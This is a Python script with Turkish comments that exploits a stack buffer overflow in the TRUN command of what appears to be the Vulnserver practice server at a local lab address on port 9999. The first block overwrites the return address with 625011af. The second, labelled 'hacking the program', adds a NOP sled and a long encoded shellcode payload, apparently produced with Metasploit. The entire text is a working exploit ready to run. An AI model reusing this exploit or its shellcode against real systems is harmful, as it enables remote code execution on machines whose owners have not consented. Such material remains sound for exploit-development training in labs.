import socket
import sys

#625011af

stringToSend="TRUN /.:/" + "A"*2003 + "\xaf\x11\x50\x62"

try:
    baglanti=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    baglanti.connect(("192.168.1.107",9999))
    byte=stringToSend.encode(encoding="latin1")
    baglanti.send(byte)
    baglanti.close()
        
except KeyboardInterrupt:
    sys.exit()
except Exception as e:
    print(e)
    sys.exit()


#Programı Hacklemek
#Msfconsole 

import socket
import sys

#625011af

overflowpayload=("\xdb\xc7\xd9\x74\x24\xf4\x5b\x29\xc9\xb1\x5e\xba\xe2\xd5"
"\x38\xe3\x31\x53\x1a\x03\x53\x1a\x83\xc3\x04\xe2\x17\x29"
"\xd0\x6c\xd7\xd2\x21\x13\x5e\x37\x10\x01\x04\x33\x01\x95"
"\x4f\x11\xaa\x5e\x1d\x82\x83\x9f\xae\x1d\xa9\x79\x3b\x13"
"\x06\xb7\xfb\x78\x6a\xd6\x87\x82\xbf\x38\xb6\x4c\xb2\x39"
"\xff\x1a\xb8\xd6\xad\xcb\xc9\x7b\x41\x7f\x8f\x47\x60\xaf"
"\x9b\xf8\x1a\xca\x5c\x8c\x96\xd5\x8c\x3d\xad\x9e\x34\x35"
"\xe9\x3e\x44\x9a\x8c\xf6\x32\x20\xc7\x83\x8f\xd3\xe6\x6c"
"\xee\x35\x39\x53\x5d\x78\xf6\x5e\x9f\xbc\x30\x81\xea\xb6"
"\x43\x3c\xed\x0c\x3e\x9a\x78\x93\x98\x69\xda\x77\x19\xbd"
"\xbd\xfc\x15\x0a\xc9\x5b\x39\x8d\x1e\xd0\x45\x06\xa1\x37"
"\xcc\x5c\x86\x93\x95\x07\xa7\x82\x73\xe9\xd8\xd5\xdb\x56"
"\x7d\x9d\xc9\x81\x01\x5e\x12\xae\x5f\xc9\xdf\x63\x60\x09"
"\x77\xf3\x13\x3b\xd8\xaf\xbb\x77\x91\x69\x3b\x01\xb5\x89"
"\x93\xa9\xd5\x77\x14\xca\xfc\xb3\x40\x9a\x96\x12\xe9\x71"
"\x66\x9a\x3c\xef\x6c\x0c\x7f\x58\x71\xba\x17\x9b\x71\x53"
"\xb4\x12\x97\x03\x14\x75\x07\xe4\xc4\x35\xf7\x8c\x0e\xba"
"\x28\xac\x30\x10\x41\x47\xdf\xcd\x3a\xf0\x46\x54\xb0\x61"
"\x86\x42\xbd\xa2\x0c\x67\x42\x6c\xe5\x02\x50\x99\x92\xec"
"\xa8\x5a\x37\xed\xc2\x5e\x91\xba\x7a\x5d\xc4\x8d\x25\x9e"
"\x23\x8e\x21\x60\xb2\xa7\x5a\x57\x20\x88\x34\x98\xa4\x08"
"\xc4\xce\xae\x08\xac\xb6\x8a\x5a\xc9\xb8\x06\xcf\x42\x2d"
"\xa9\xa6\x37\xe6\xc1\x44\x6e\xc0\x4d\xb6\x45\x52\x89\x48"
"\x18\x7d\x32\x21\xe2\x3d\xc2\xb1\x88\xbd\x92\xd9\x47\x91"
"\x1d\x2a\xa8\x38\x76\x22\x23\xad\x34\xd3\x34\xe4\x99\x4d"
"\x35\x0b\x02\x7d\x4c\x64\xb5\x7e\xb1\x6c\xd2\x7e\xb2\x90"
"\xe4\x43\x65\xa9\x92\x82\xb6\x8e\xbd\x18\x12\xfb\x55\x85"
"\xf7\x46\x38\x36\x22\x84\x45\xb5\xc6\x75\xb2\xa5\xa3\x70"
"\xfe\x61\x58\x09\x6f\x04\x5e\xbe\x90\x0d")

stringToSend="TRUN /.:/" + "A"*2003 + "\xaf\x11\x50\x62" +"\x90"*32 + overflowpayload
                                      #x90 boş olarak gider bunu kullanmak gerekir yoksa program çalışmayabilir

try:
    baglanti=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    baglanti.connect(("192.168.1.107",9999))
    byte=stringToSend.encode(encoding="latin1")
    baglanti.send(byte)
    baglanti.close()
except Exception as e:
    print(e)
    sys.exit()



